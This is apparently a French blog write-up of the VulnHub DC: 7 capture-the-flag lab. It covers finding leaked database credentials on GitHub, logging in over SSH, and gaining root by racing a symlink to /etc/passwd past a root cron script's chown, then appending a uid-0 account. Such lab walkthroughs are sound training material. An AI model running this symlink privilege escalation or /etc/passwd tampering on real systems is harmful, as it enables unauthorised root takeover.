---
title: "Solution du CTF DC: 7 de VulnHub"
tags: [VulnHub, CTF]
---

Le CTF [DC: 7 de VulnHub](https://vulnhub.com/entry/dc-7,356/) s'est montré un peu compliqué sur l'obtention du premier accès. Il faut avoir la curiosité nécessaire pour aller fouiller sur le web pour trouver la clé de la première étape chose que je n'apprécie pas vraiment sur les CTFs.

Passé ça, c'est finalement assez simple pour peu que l'on soit un peu patient.

## bfg --delete-files YOUR-FILE-WITH-SENSITIVE-DATA

Nmap nous inique que la VM écoute sur deux ports : un SSH et un serveur web faisant tourner un `Drupal 8`.

Sur `Metasploit` on trouve un exploit pouvant correspondre à cette version, mais ce dernier échoue, et pour cause, la page `/admin` retourne une erreur `403` avec le message *You have been denied!*

Une recherche sur *Google* ne retourne rien d'intéressant concernant ce message d'erreur. Il faut croire que ce n'est pas une erreur standard et que le créateur du CTF a bloqué l'accès à la page pour empêcher toute exploitation.

Une énumération web ne retourne aucun fichier qui ne soit pas lié directement à Drupal, de plus l'application n'est pas très réactive à répondre... Il faut donc aller voir ailleurs, ce que l'auteur du CTF nous laisse entendre avec ce message :

> DC-7 introduces some "new" concepts, but I'll leave you to figure out what they are.  :-)
> 
> While this challenge isn't all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won't succeed.
> 
> What you will have to do, is to think "outside" the box.
> 
> Way "outside" the box. :-)

En pied de page du Drupal on peut lire la signature `@DC7USER` laissant penser à un compte Twitter... [Et c'est le cas](https://twitter.com/dc7user). Ce compte a dans son profil un lien vers un compte Github qui détient un repository.

Dans le repository en question, on trouve [un fichier config.php](https://github.com/Dc7User/staffdb/commit/982e1c7778dec9277539f71e56d005cb7ce0f486#diff-724326d4c9977d3f53ba0f053c7d857dc8b8ef4f2d61b2b377791b4ec560720d) contenant des identifiants :

```php
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```

## Kansas City Shuffle

Ces identifiants permettent un accès SSH sur la machine :

```console
$ ssh dc7user@192.168.56.138
The authenticity of host '192.168.56.138 (192.168.56.138)' can't be established.
ED25519 key fingerprint is SHA256:BDWqBUcitB8KKGYDyoeZkt2C/aXhZ7gi5xSEtOSB+Rk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.138' (ED25519) to the list of known hosts.
dc7user@192.168.56.138's password: 
Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Fri Aug 30 03:10:09 2019 from 192.168.0.100
dc7user@dc-7:~$ mail
"/var/mail/dc7user": 26 messages 26 new
>N   1 Cron Daemon        Wed Mar 22 18:15  22/800   Cron <root@dc-7> /opt/scripts/backups.sh
 N   2 Cron Daemon        Wed Mar 22 18:37  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N   3 Cron Daemon        Wed Mar 22 18:58  21/729   Cron <root@dc-7> /opt/scripts/backups.sh
 N   4 Cron Daemon        Wed Mar 22 19:28  24/997   Cron <root@dc-7> /opt/scripts/backups.sh
 N   5 Cron Daemon        Wed Mar 22 19:39  25/1071  Cron <root@dc-7> /opt/scripts/backups.sh
 N   6 Cron Daemon        Wed Mar 22 19:39  24/1007  Cron <root@dc-7> /opt/scripts/backups.sh
 N   7 Cron Daemon        Wed Mar 22 19:45  22/895   Cron <root@dc-7> /opt/scripts/backups.sh
? 1
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Wed, 22 Mar 2023 18:15:13 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1petcn-0000Gj-Sj
        for root@dc-7; Wed, 22 Mar 2023 18:15:13 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1petcn-0000Gj-Sj@dc-7>
Date: Wed, 22 Mar 2023 18:15:13 +1000

rm: cannot remove '/home/dc7user/backups/*': No such file or directory
Database dump saved to /home/dc7user/backups/website.sql               [success]
```

En lisant les mails de l'utilisateur, on voit qu'une tache cron exécute `/opt/scripts/backups.sh` en tant que root.

Nous ne disposons pas de droits sur le script en question :

```console
dc7user@dc-7:~$ ls -al /opt/scripts/backups.sh
-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh
dc7user@dc-7:~$ cat /opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
dc7user@dc-7:~$ ls /home/dc7user/backups/
website.sql.gpg  website.tar.gz.gpg
You have new mail in /var/mail/dc7user
dc7user@dc-7:~$ id
uid=1000(dc7user) gid=1000(dc7user) groups=1000(dc7user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

Ma première idée était de récupérer les droits `www-data` ainsi je pourrais modifier `backups.sh`.

Il n'y a que deux dossiers sous la racine web où je peux écrire :

```console
dc7user@dc-7:~$ find /var/www/ -type d -writable 2> /dev/null 
/var/www/html/sites/default/files/php
/var/www/html/sites/default/files/php/twig
```

Malheureusement, il faut faire avec les restrictions présentes dans le `.htaccess` situé à la racine :

```apache
# Protect files and directories from prying eyes.
<FilesMatch "\.(engine|inc|install|make|module|profile|po|sh|.*sql|theme|twig|tpl(\.php)?|xtmpl|yml)(~|\.sw[op]|\.bak|\.orig|\.save)?$|^(\.(?!well-known).*|Entries.*|Repository|Root|Tag|Template|composer\.(json|lock))$|^#.*#$|\.php(~|\.sw[op]|\.bak|\.orig|\.save)$">
  <IfModule mod_authz_core.c>
    Require all denied
  </IfModule>
  <IfModule !mod_authz_core.c>
    Order allow,deny
  </IfModule>
</FilesMatch>
```

On voit que le dossier `twig` est tout simplement banni. Son dossier parent ne l'est pas, mais impossible d'accéder à un fichier avec l'extension `.php` classique.

J'ai essayé de placer un script PHP avec des dérivés d'extensions php (`.phtml`, `.php5`, `.phar`, etc) mais aucune n'était interprétée même en tentant de forcer l'interprétation avec un `.htaccess` utilisant la directive `AddType` comme pour le [CTF Xerxes]({% link _posts/2014-03-07-Solution-du-CTF-Xerxes-de-VulnHub.md %}).

Du coup je me suis rabattu sur l'exploitation directe de la tache cron à savoir l'utilisation de la commande `chown` dans le script :

```bash
chown dc7user:dc7user /home/dc7user/backups/*
```

La vulnérabilité vient du fait que `chown` n'est pas appelé en mode récursif. Il s'applique à tous les fichiers et dossiers directement dans `/home/dc7user/backups/` et à cause de ça il changera les permissions même sur les fichiers ou dossiers pointés par des liens symboliques.

Quand on regarde à nouveau les mails on voit que la tache cron est exécutée toute les 15 minutes :

```
 U   2 Cron Daemon        Thu Mar 23 01:00  23/748   Cron <root@dc-7> /opt/scripts/backups.sh
 U   3 Cron Daemon        Thu Mar 23 01:15  23/748   Cron <root@dc-7> /opt/scripts/backups.sh
```

On va faire une boucle infinie qui créé un lien symbolique vers `/etc/passwd`. Boucler nous permet de nous assurer que le lien symbolique existera entre la première instruction du script (`rm /home/dc7user/backups/*`) et le `chown`. `rm` de son côté supprime le lien symbolique, mais pas le fichier pointé donc aucun risque.

```bash
while true; do ln -s /etc/passwd /home/dc7user/backups/yolo 2> /dev/null ; done
```

Après de longues minutes les permissions sont effectives. On peut rajouter un compte dans `/etc/passwd` (user `devloop`, mot de passe `hello`).

```console
dc7user@dc-7:~$ ls -al /etc/passwd
-rw-r--r-- 1 dc7user dc7user 1494 Aug 29  2019 /etc/passwd
dc7user@dc-7:~$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd
dc7user@dc-7:~$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root      
# ls
theflag.txt
# cat theflag.txt




888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

## La méthode officielle

J'ai vu que [mzfr a utilisé une solution alternative](https://blog.mzfr.me/vulnhub-writeups/2019-08-31-DC7) en changeant le mot de passe du compte admin sur le Drupal à l'aide d'un utilitaire nommé `drush` (équivalent d'un `wp-cli` pour Wordpress).
Il pouvait alors se connecter en admin sur le Drupal mais il fallait passer par `/user/login` et non par `/admin`.
Il fallait alors procéder à l'écriture de code PHP comme je l'ai fait par exemple sur le [CTF DC: 1]({% link _posts/2023-03-20-Solution-du-CTF-DC-1-de-VulnHub.md %})

Je suis assez étonné d'être apparemment le seul à avoir exploité le `chown` mais 20 ans d'utilisation de Linux ont dû avoir raison de moi 😂 
